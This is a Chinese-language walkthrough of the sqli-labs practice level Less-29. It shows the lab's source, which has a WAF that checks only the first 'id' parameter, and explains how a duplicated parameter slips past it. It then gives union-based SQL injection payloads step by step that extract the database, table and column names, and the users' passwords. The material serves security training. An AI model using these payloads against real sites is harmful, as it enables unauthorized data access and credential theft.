# Less-29 （HPP 参数污染绕过 WAF）

## 查看分析源码

这关模拟了 Java WAF + PHP 后端的双层架构。没有 `preg_replace` 过滤，只有 WAF 白名单：

```php
$qs = $_SERVER['QUERY_STRING'];              // 原样 query string
$id1 = java_implimentation($qs);             // 取第一个 id
whitelist($id1);                              // 检查必须纯数字

$id = $_GET['id'];                           // PHP 取最后一个 id
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`java_implimentation` 模拟了 Tomcat 的行为——只取第一个 `id` 参数的值：

```php
function java_implimentation($query_string)
{
    $q_s = $query_string;
    $qs_array= explode("&",$q_s);            // 按 & 拆开
    foreach($qs_array as $key => $value)
    {
        $val=substr($value,0,2);              // 前两个字符
        if($val=="id") {                      // 第一个是 id 的
            $id_value=substr($value,3,30);    // 取值
            return $id_value;                 // 直接返回，后面的不管
        }
    }
}
```

WAF 白名单：

```php
function whitelist($input)
{
    $match = preg_match("/^\d+$/", $input);  // 必须纯数字
    if(!$match) {
        header('Location: hacked.php');       // 不通过跳警告页
    }
}
```

## 原理

同一个参数出现两次，WAF 和后端取的不一样：

```
?id=1&id=-1' union select 1,2,3--+
    ↑                ↑
  WAF看第一个       PHP用最后一个
  id=1（纯数字）    id=-1' union...
  ✅ 通过            ✅ 注入
```

**这关没有关键词过滤**，`union` `select` `--+` 空格全能用，因为唯一的防御就是那个白名单检查。

## order by

```
?id=1&id=1' order by 3--+
?id=1&id=1' order by 4--+
```

## 回显位

```
?id=1&id=-1' union select 1,2,3--+
```

## 爆库名

```
?id=1&id=-1' union select 1,database(),3--+
```

## 爆表名

```
?id=1&id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

## 爆列名

```
?id=1&id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
```

## 爆数据

```
?id=1&id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```
![](99_Attachments/图片/Less-29/file-20260615202314677.png)
## 不同服务器的 HPP 行为

| 服务器 | 重复参数处理 |
|--------|-------------|
| Apache/PHP | 取最后一个 |
| Tomcat/JSP | 取第一个 |
| IIS/ASP | 拼接（逗号分隔） |
| Python/Flask | 取列表 |

总结：WAF 和后端对同一个参数的处理不一样，就是 HPP 的绕过点。这关是唯一一个不需要绕过关键词过滤的关卡——全是光明正大写的。
